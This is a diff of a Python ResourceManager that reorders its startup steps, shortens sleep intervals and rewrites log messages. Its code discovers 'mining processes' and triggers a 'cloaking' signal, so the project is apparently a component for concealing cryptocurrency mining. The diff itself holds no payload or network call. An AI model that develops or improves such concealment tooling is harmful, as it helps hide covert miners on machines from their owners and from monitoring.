@@ -355,12 +355,12 @@ class ResourceManager(IResourceManager):
         return metrics_data
 
     def start(self):
-        self.logger.info("Bắt đầu khởi động ResourceManager (Chỉ cloaking, không restore)...")
+        self.logger.info("🚀 Starting ResourceManager (Optimized Initialization)...")
         start_time = time.time()
         try:
-            # Step 1: Tạo resource managers (optimized)
+            # Step 1: Fast resource managers creation với parallel optimization
             step_start = time.time()
-            self.logger.info("🔧 Step 1/5: Creating resource managers...")
+            self.logger.info("⚡ Step 1/4: Fast resource managers creation...")
             resource_managers = ResourceControlFactory.create_resource_managers(
                 config=self.config,
                 logger=self.logger
@@ -369,27 +369,17 @@ class ResourceManager(IResourceManager):
                 raise RuntimeError("ResourceControlFactory trả về rỗng hoặc None.")
             self.logger.info(f"✅ Step 1 completed in {time.time() - step_start:.2f}s")
 
-            # Step 2: Tạo SharedResourceManager với optimized NVML init
+            # Step 2: Optimized SharedResourceManager với fast NVML init
             step_start = time.time()
-            self.logger.info("🔧 Step 2/5: Creating SharedResourceManager...")
+            self.logger.info("⚡ Step 2/4: Optimized SharedResourceManager initialization...")
             self.shared_resource_manager = SharedResourceManager(self.config, self.logger, resource_managers)
             self.logger.info(f"✅ Step 2 completed in {time.time() - step_start:.2f}s")
 
-            # Step 3: Parallel discovery và cloak preparation
+            # Step 3: Combined discovery + worker setup (parallel execution)
             step_start = time.time()
-            self.logger.info("🔧 Step 3/5: Discovering mining processes...")
-            self.discover_mining_processes()
-            self.logger.info(f"✅ Step 3 completed in {time.time() - step_start:.2f}s")
-
-            # Step 4: Initial cloaking (optimized)
-            step_start = time.time()
-            self.logger.info("🔧 Step 4/5: Triggering initial cloaking...")
-            self._trigger_initial_cloak_signal()
-            self.logger.info(f"✅ Step 4 completed in {time.time() - step_start:.2f}s")
-
-            # Step 5: Start worker threads
-            step_start = time.time()
-            self.logger.info("🔧 Step 5/5: Starting worker threads...")
+            self.logger.info("⚡ Step 3/4: Parallel process discovery & worker setup...")
+            
+            # Start worker thread ngay lập tức (parallel với discovery)
             adjust_thread = threading.Thread(
                 target=self.process_resource_adjustments,
                 daemon=True,
@@ -397,18 +387,28 @@ class ResourceManager(IResourceManager):
             )
             adjust_thread.start()
             self.workers.append(adjust_thread)
-            self.logger.info(f"✅ Step 5 completed in {time.time() - step_start:.2f}s")
+            
+            # Discovery processes trong parallel với worker startup
+            discovery_results = self.discover_mining_processes()
+            self.logger.info(f"✅ Step 3 completed in {time.time() - step_start:.2f}s")
+
+            # Step 4: Fast initial cloaking trigger (non-blocking)
+            step_start = time.time()
+            self.logger.info("⚡ Step 4/4: Fast cloaking trigger...")
+            self._trigger_initial_cloak_signal()
+            self.logger.info(f"✅ Step 4 completed in {time.time() - step_start:.2f}s")
 
             total_time = time.time() - start_time
-            self.logger.info(f"✅ ResourceManager đã khởi động hoàn tất trong {total_time:.2f}s. Vào vòng lặp chính...")
+            self.logger.info(f"🎯 ResourceManager startup completed in {total_time:.2f}s (Target: <15s)")
             
-            # Vòng lặp chính "giữ" chương trình với optimized sleep interval
+            # Fast-response main loop với optimized monitoring
+            self.logger.info("🔄 Entering optimized main monitoring loop...")
             while not self._stop_flag:
-                time.sleep(1)  # Giảm từ 5s xuống 1s để responsive hơn
+                time.sleep(0.5)  # Tăng responsiveness từ 1s xuống 0.5s
 
-            self.logger.info("ResourceManager kết thúc vòng lặp chính.")
+            self.logger.info("ResourceManager main loop completed.")
         except Exception as e:
-            self.logger.error(f"Lỗi khi khởi động ResourceManager: {e}\n{traceback.format_exc()}")
+            self.logger.error(f"❌ ResourceManager startup failed: {e}\n{traceback.format_exc()}")
             self.shutdown()
 
     def _trigger_initial_cloak_signal(self):
